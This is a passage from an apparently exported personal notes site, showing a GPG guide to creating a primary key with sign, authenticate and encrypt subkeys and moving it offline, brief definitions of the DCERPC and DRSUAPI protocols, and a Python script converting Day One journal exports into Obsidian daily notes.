single-purpose keys that are rotated once per year (the 13 month expiration provides a little bit of wiggle-room).&lt;/p&gt;\n&lt;h2 id=&quot;create-the-initial-key&quot;&gt;Create the initial key&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#create-the-initial-key&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;gpg&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; --expert&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; --full-generate-key&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;ul&gt;\n&lt;li&gt;Choose “ECC (set your own capabilities)”&lt;/li&gt;\n&lt;li&gt;Toggle the “Sign” capability &lt;em&gt;off&lt;/em&gt; (&lt;code&gt;S&lt;/code&gt;).&lt;/li&gt;\n&lt;li&gt;Finish choosing capabilities (&lt;code&gt;Q&lt;/code&gt;).&lt;/li&gt;\n&lt;li&gt;Choose “Curve 25519”.&lt;/li&gt;\n&lt;li&gt;Expire in 13 months (&lt;code&gt;13m&lt;/code&gt;).&lt;/li&gt;\n&lt;li&gt;Enter your name.&lt;/li&gt;\n&lt;li&gt;Enter the primary email address for the key.&lt;/li&gt;\n&lt;li&gt;&lt;em&gt;Do not enter a comment.&lt;/em&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;h2 id=&quot;edit-the-key&quot;&gt;Edit the key&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#edit-the-key&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;gpg&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; --expert&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; --edit-key&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $KEYID&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;h3 id=&quot;add-uids&quot;&gt;Add UIDs&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#add-uids&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;ul&gt;\n&lt;li&gt;Use &lt;code&gt;adduid&lt;/code&gt;.&lt;/li&gt;\n&lt;li&gt;Enter your name.&lt;/li&gt;\n&lt;li&gt;Enter the primary email address for the key.&lt;/li&gt;\n&lt;li&gt;&lt;em&gt;Do not enter a comment.&lt;/em&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;h3 id=&quot;add-a-signing-subkey&quot;&gt;Add a signing subkey&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#add-a-signing-subkey&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;ul&gt;\n&lt;li&gt;Use &lt;code&gt;addkey&lt;/code&gt;.&lt;/li&gt;\n&lt;li&gt;Choose “ECC (sign only)”&lt;/li&gt;\n&lt;li&gt;Choose “Curve 25519”.&lt;/li&gt;\n&lt;li&gt;Expire in 13 months (&lt;code&gt;13m&lt;/code&gt;).&lt;/li&gt;\n&lt;/ul&gt;\n&lt;h3 id=&quot;add-an-authentication-subkey&quot;&gt;Add an authentication subkey&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#add-an-authentication-subkey&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;ul&gt;\n&lt;li&gt;Use &lt;code&gt;addkey&lt;/code&gt;.&lt;/li&gt;\n&lt;li&gt;Choose “ECC (set your own capabilities)”&lt;/li&gt;\n&lt;li&gt;Toggle the “Sign” capability &lt;em&gt;off&lt;/em&gt; (&lt;code&gt;S&lt;/code&gt;).&lt;/li&gt;\n&lt;li&gt;Toggle the “Authenticate” capability on (&lt;code&gt;A&lt;/code&gt;).&lt;/li&gt;\n&lt;li&gt;Finish choosing capabilities (&lt;code&gt;Q&lt;/code&gt;).&lt;/li&gt;\n&lt;li&gt;Choose “Curve 25519”.&lt;/li&gt;\n&lt;li&gt;Expire in 13 months (&lt;code&gt;13m&lt;/code&gt;).&lt;/li&gt;\n&lt;/ul&gt;\n&lt;h3 id=&quot;add-an-encryption-subkey&quot;&gt;Add an encryption subkey&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#add-an-encryption-subkey&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;ul&gt;\n&lt;li&gt;Use &lt;code&gt;addkey&lt;/code&gt;.&lt;/li&gt;\n&lt;li&gt;Choose “ECC (encrypt only)”&lt;/li&gt;\n&lt;li&gt;Choose “Curve 25519”.&lt;/li&gt;\n&lt;li&gt;Expire in 13 months (&lt;code&gt;13m&lt;/code&gt;).&lt;/li&gt;\n&lt;/ul&gt;\n&lt;h3 id=&quot;finish-up&quot;&gt;Finish up&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#finish-up&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;p&gt;Be sure to save the key before exiting.&lt;/p&gt;\n&lt;h2 id=&quot;remove-the-primary-key-for-safe-keeping&quot;&gt;Remove the primary key for safe keeping&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#remove-the-primary-key-for-safe-keeping&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Export keys&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;gpg&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; --armor&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; --export-secret-key&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $KEYID&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; &gt;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $KEYID&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;.asc&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;gpg&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; --export-secret-subkeys&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $KEYID&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; &gt;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; subkeys.gpg&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Delete secret keys (BOTH primary and subkeys)&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;gpg&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; --delete-secret-keys&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $KEYID&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Re-import secret subkeys&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;gpg&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; --import&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; subkeys.gpg&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Optionally verify that eveything worked...&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;gpg&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; --list-keys&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;gpg&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; --list-secret-keys&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Cleanup&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;rm&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; subkeys.gpg&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;Once this is done, &lt;code&gt;$KEYID.asc&lt;/code&gt; can be stored “offline” on a secure (encrypted!) drive, etc. Note that this key will need to be re-imported to generate new subkeys, add UIDs, extend expiration dates, or create updated revocation certificates.&lt;/p&gt;\n&lt;h2 id=&quot;export-the-authentication-subkey-to-ssh&quot;&gt;Export the authentication subkey to SSH&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#export-the-authentication-subkey-to-ssh&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;ul&gt;\n&lt;li&gt;Run &lt;code&gt;gpg --list-secret-keys --with-keygrip&lt;/code&gt;.&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;https://opensource.com/article/19/4/gpg-subkeys-ssh&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;Copy keygrips of the authentication subkeys (&lt;code&gt;A&lt;/code&gt;) you want to use in SSH to &lt;code&gt;~/.gnupg/sshcontrol&lt;/code&gt;.&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;https://serverfault.com/questions/906871/force-the-use-of-a-gpg-key-as-an-ssh-key-for-a-given-server/964317#964317&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;Generate the SSH public key using &lt;code&gt;gpg --export-ssh-key $KEYID &gt; ~/.ssh/id_${KEYID}.pub&lt;/code&gt;.&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; This key can then be referenced using the IdentityFile directive in &lt;code&gt;~/.ssh/config&lt;/code&gt; or inserted into a host’s &lt;code&gt;~/.ssh/authorized_keys&lt;/code&gt; file.&lt;/li&gt;\n&lt;/ul&gt;"},"spells/DCERPC":{"slug":"spells/DCERPC","filePath":"spells/DCERPC.md","title":"DCERPC","links":[],"tags":["Protocol/DCERPC","OS/Windows/Server"],"content":"DCERPC is Windows Server’s RPC connection protocol.","richContent":"&lt;p&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/DCE/RPC&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;DCERPC&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; is Windows Server’s RPC connection protocol.&lt;/p&gt;"},"spells/DRSUAPI":{"slug":"spells/DRSUAPI","filePath":"spells/DRSUAPI.md","title":"DRSUAPI","links":[],"tags":["OS/Windows/Server","OS/Windows/ActiveDirectory","Protocol/DRSUAPI"],"content":"DRSUAPI is Windows’ implementation of the “Directory Replication Service” protocol, which is used to keep domain controllers in sync.","richContent":"&lt;p&gt;&lt;a href=&quot;https://wiki.samba.org/index.php/DRSUAPI&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;DRSUAPI&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; is Windows’ implementation of the “Directory Replication Service” protocol, which is used to keep domain controllers in sync.&lt;/p&gt;"},"spells/Day-One-to-Obsidian-conversion-script":{"slug":"spells/Day-One-to-Obsidian-conversion-script","filePath":"spells/Day One to Obsidian conversion script.md","title":"Day One to Obsidian conversion script","links":[],"tags":["Application/Obsidian","Application/DayOne","Language/Python"],"content":"The below script, when run in a directory of Day One JSON exports. The result is an opinionated output of Obsidian-compatible Markdown files. The big difference between this script and similar implementations (like dayone-to-obsidian) is that only one Markdown file is generated per day, with Day one entries arranged chronologically within it. This approach is much more compatible with the current Obsidian daily note plugin ecosystem, (almost) all of which assume only a single note per day.\nThis is also a pretty simple implementation. So while it’s output is opinionated, it should also be pretty easy to adapt this script to different use cases.\n\n\n                  \n                  Note\n                  \n                \n\n\nDay One has a tendency to add extra spaces, or add/remove additional line breaks, in a somewhat random fashion. This script tries to correct for some of the more common issues, but it doesn’t correct for all of them. It will be necessary to do a hand-editing pass over the generated Markdown files in order to catch any remaining formatting issues.\nThe only way around this is probably to directly parse the JSON representation of each journal entry, but that would make for a much more complicated script, and it’s not clear that the extra effort it would take to write such a parser would be less than the effort required just to manually review the output files.\n\n\n\n#!/usr/bin/env python3\n \nimport os\nimport json\n \nfrom datetime import datetime\nfrom zoneinfo import ZoneInfo\n \n# Read in all JSON files in the directory\n#\nrawDayOneData = {}\n \nfor file in os.listdir(&quot;.&quot;):\n\tif file.endswith(&quot;.json&quot;):\n\t\twith open(file) as jsonData:\n\t\t\trawDayOneData[file.replace(&quot;.json&quot;, &quot;&quot;)] = json.load(jsonData)\n \n# Create master document list\n#\njournalData = {}\n \nfor journalName, rawJournalData in rawDayOneData.items():\n\tfor entry in rawJournalData[&quot;entries&quot;]:\n\t\tentryDateTimeObject = datetime.fromisoformat(entry[&quot;creationDate&quot;])\n\t\tentryDate = entryDateTimeObject.astimezone(ZoneInfo(entry[&quot;timeZone&quot;])).strftime(&quot;%Y-%m-%d&quot;)\n\t\tentryTime = entryDateTimeObject.astimezone(ZoneInfo(entry[&quot;timeZone&quot;])).strftime(&quot;%H:%M&quot;)\n\t\tentryDateTime = entryDateTimeObject.astimezone(ZoneInfo(entry[&quot;timeZone&quot;])).strftime(&quot;%Y-%m-%dT%H:%M:%S&quot;)\n \n\t\tentryUuid = entry[&quot;uuid&quot;].lower()\n\t\tentryIndex = entryDateTime + &quot;|&quot; + entryUuid\n\t\t\n\t\tentryTags = &quot;#&quot; + journalName.replace(&quot; &quot;, &quot;&quot;)\n\t\tif &quot;tags&quot; in entry:\n\t\t\tfor tag in entry[&quot;tags&quot;]:\n\t\t\t\tentryTags = entryTags + &quot; #&quot; + tag.replace(&quot; &quot;, &quot;&quot;)\n \n\t\tif (&quot;#Art&quot; in entryTags) and (&quot;#Photography&quot; in entryTags):\n\t\t\tentryHeader = &quot;## &quot; + entryTime + &quot; | Photography&quot;\n\t\telse:\n\t\t\tentryHeader = &quot;## &quot; + entryTime + &quot; | &quot; + journalName\n \n\t\tentryLocation = &quot;&quot;\n\t\tif &quot;location&quot; in entry:\n\t\t\tentryLocation = &quot;[&quot; + entry[&quot;location&quot;][&quot;placeName&quot;] + &quot;](geo:&quot; + str(round(entry[&quot;location&quot;][&quot;latitude&quot;], 4)) + &quot;,&quot; + str(round(entry[&quot;location&quot;][&quot;longitude&quot;], 4)) + &quot;)&quot;\n\t\t\n\t\tentryWeather = &quot;&quot;\n\t\tif &quot;weather&quot; in entry:\n\t\t\tentryWeather = str(int(round(entry[&quot;weather&quot;][&quot;temperatureCelsius&quot;], 0))) + &quot; °C&quot;\n\t\t\tif &quot;conditionsDescription&quot; in entry[&quot;weather&quot;]:\n\t\t\t\tentryWeather = entryWeather + &quot; • &quot; + entry[&quot;weather&quot;][&quot;conditionsDescription&quot;]\n\t\t\telif &quot;weatherCode&quot; in entry[&quot;weather&quot;]:\n\t\t\t\tentryWeather = entryWeather + &quot; • &quot; + entry[&quot;weather&quot;][&quot;weatherCode&quot;]\n \n\t\tentryMedia = {}\n\t\tif &quot;audios&quot; in entry:\n\t\t\tfor audioFile in entry[&quot;audios&quot;]:\n\t\t\t\tentryMedia[&quot;![](dayone-moment:/audio/&quot; + audioFile[&quot;identifier&quot;] + &quot;)&quot;] = &quot;![[&quot; + audioFile[&quot;md5&quot;] + audioFile[&quot;format&quot;] + &quot;]]&quot;\n\t\tif &quot;pdfs&quot; in entry:\n\t\t\tfor pdfFile in entry[&quot;pdfs&quot;]:\n\t\t\t\tentryMedia[&quot;![](dayone-moment:/pdfAttachment/&quot; + pdfFile[&quot;identifier&quot;] + &quot;)&quot;] = &quot;![[&quot; + pdfFile[&quot;md5&quot;] + &quot;.pdf&quot; + &quot;]]&quot;\n\t\tif &quot;photos&quot; in entry:\n\t\t\tfor imageFile in entry[&quot;photos&quot;]:\n\t\t\t\tentryMedia[&quot;![](dayone-moment://&quot; + imageFile[&quot;identifier&quot;] + &quot;)&quot;] = &quot;![[&quot; + imageFile[&quot;md5&quot;] + &quot;.&quot; + imageFile[&quot;type&quot;] + &quot;]]&quot;\n\t\tif &quot;videos&quot; in entry:\n\t\t\tfor videoFile in entry[&quot;videos&quot;]:\n\t\t\t\tentryMedia[&quot;![](dayone-moment:/video/&quot; + videoFile[&quot;identifier&quot;] + &quot;)&quot;] = &quot;![[&quot; + videoFile[&quot;md5&quot;] + &quot;.&quot; + videoFile[&quot;type&quot;] + &quot;]]&quot;\n\t\t\n\t\tentryText = entry[&quot;text&quot;]\n \n\t\tfor oldMediaLink, newMediaLink in entryMedia.items():\n\t\t\tentryText = entryText.replace(oldMediaLink, newMediaLink)\n \n\t\tentryText = entryText.replace(&quot;\\n\\n\\n&quot;, &quot;\\n\\n&quot;)\n\t\tentryText = entryText.replace(&quot; ![[&quot;, &quot;\\n\\n![[&quot;)\n\t\tentryText = entryText.replace(&quot;]]\\n\\n![[&quot;, &quot;]]\\n![[&quot;)\n\t\tentryText = entryText.replace(&quot;.\\n![[&quot;, &quot;.\\n\\n![[&quot;)\n\t\tentryText = entryText.replace(&quot;!\\n![[&quot;, &quot;!\\n\\n![[&quot;)\n\t\tentryText = entryText.replace(&quot;?\\n![[&quot;, &quot;?\\n\\n![[&quot;)\n\t\tentryText = entryText.replace(&quot;)\\n![[&quot;, &quot;)\\n\\n![[&quot;)\n\t\tentryText = entryText.replace(&quot;\\\\&amp;&quot;, &quot;&amp;&quot;)\n\t\tentryText = entryText.replace(&quot;\\\\~&quot;, &quot;~&quot;)\n\t\tentryText = entryText.replace(&quot;\\\\-&quot;, &quot;-&quot;)\n\t\tentryText = entryText.replace(&quot;\\\\_&quot;, &quot;_&quot;)\n\t\tentryText = entryText.replace(&quot;\\\\+&quot;, &quot;+&quot;)\n\t\tentryText = entryText.replace(&quot;\\\\.&quot;, &quot;.&quot;)\n\t\tentryText = entryText.replace(&quot;\\\\!&quot;, &quot;!&quot;)\n\t\tentryText = entryText.replace(&quot;\\\\(&quot;, &quot;(&quot;)\n\t\tentryText = entryText.replace(&quot;\\\\)&quot;, &quot;)&quot;)\n\t\tentryText = entryText.replace(&quot;\\\\{&quot;, &quot;{&quot;)\n\t\tentryText = entryText.replace(&quot;\\\\}&quot;, &quot;}&quot;)\n\t\tentryText 